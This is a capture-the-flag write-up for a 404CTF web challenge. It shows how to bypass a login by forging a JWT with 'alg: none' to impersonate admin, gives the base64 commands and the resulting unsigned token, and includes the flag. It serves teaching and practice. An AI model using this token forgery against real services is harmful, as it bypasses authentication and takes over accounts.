[L'Académie du détail](challenge_files/README.md) - web, easy, 350 solves
===

**Author**: seaweedbrain#1321    

## Solve

Opening https://academie.challenges.404ctf.fr/, we find a standard website home page with a header including a login link:

![logged out header](logged_out.png)

a little image carousel, and a weird list of words:

![words](words.png)

The carousel sources images from the actual www.academie-francaise.fr website, so it's very unlikely that the images are relevant.

The login link lets us login with *almost* any username and password; Doing so brings us back to the homepage which now displays our chosen username, a logout link, and an additional link:

![logged in header](logged_in.png)

Unfortunately, going to https://academie.challenges.404ctf.fr/membres tells us that the member list is not yet accessible to the public, and to come back later:

![members page](members.png)

There is one username we cannot use to log in: trying to log in as `admin` returns `incorrect password`, so it seems we have to figure out an exploit that lets us login as admin and see the contents of the /membres page.

Logging in with username `a` and password `b` sets a cookie named `access-token`:

`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImEiLCJleHAiOjE2ODc4NzcyMzR9.guLGyPJKD9XzATjZGH4qvo91fttjsfe7kJUlk_eLW68`

This looks like [JWT](https://en.wikipedia.org/wiki/JSON_Web_Token?useskin=monobook), and it is; throwing it into [jwt.io](https://jwt.io) or manually decoding the first two base64 sections, delimited by `.`, gives: 

```json
{
  "alg": "HS256",
  "typ": "JWT"
}

{
  "username": "a",
  "exp": 1687877234
}
```

A quick lookup for JWT exploits turns up the common [alg: none](https://portswigger.net/kb/issues/00200901_jwt-none-algorithm-supported) exploit, which we can use to fake being logged in as admin without having to know the server's private JWT signing key:

```bash
└─[$] base64 <<<'{"alg":"none", "typ":"JWT"}'
eyJhbGciOiJub25lIiwgInR5cCI6IkpXVCJ9Cg==

└─[$] base64 <<<'{"username":"admin","exp":1687877234}'
eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjg3ODc3MjM0fQo=
```

Putting it back in JWT format by removing the base64 `=` padding, separating the three sections with `.`, leaving the 3rd section (signature) empty, gives us the value we need to set the cookie to:

`eyJhbGciOiJub25lIiwgInR5cCI6IkpXVCJ9Cg.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjg3ODc3MjM0fQo.`

This successfully logs us as admin, and we can now see the contents of the /membres page, which includes the flag:

![flag](flag.png)

`404CTF{JWT_M41_1MP13M3N73_=L35_Pr0813M35}`

## Comments

That page used to only have some flavor text and the Yourcenar pic: 

![marguerite yourcenar](marguerite.png)

The flag is actually hidden there with LSB steg, which is easily discovered by [zsteg](https://github.com/zed-0xff/zsteg):

```bash
└─[$] zsteg marguerite.png 
b1,r,lsb,xy         .. text: "C1y]E\\E{"
b1,rgb,lsb,xy       .. text: "404CTF{JWT_M41_1MP13M3N73_=L35_Pr0813M35}"
b2,r,msb,xy         .. text: "TD@TTADDD"
b2,g,msb,xy         .. text: "TD@TTADDD"
b2,b,msb,xy         .. text: "TD@TTADDD"
b4,r,msb,xy         .. text: "pb 7drB%R"
b4,g,msb,xy         .. text: "pb 7drB%R"
b4,b,msb,xy         .. text: "pb 7drB%R"
```

People complained that this was steg and not web, so the challenge was modified to have the flag directly on the page. I think that's better? My instinct is to run zsteg on everything and anything, so at the time it didn't even register for me that it was a little out of place.

But what the hell was that list of words about? That threw me off for a while, I didn't even think about checking the JWT because I was convinced the admin password would be something like the one word in the list that isn't an actual word found in any dictionary, or something equally strange.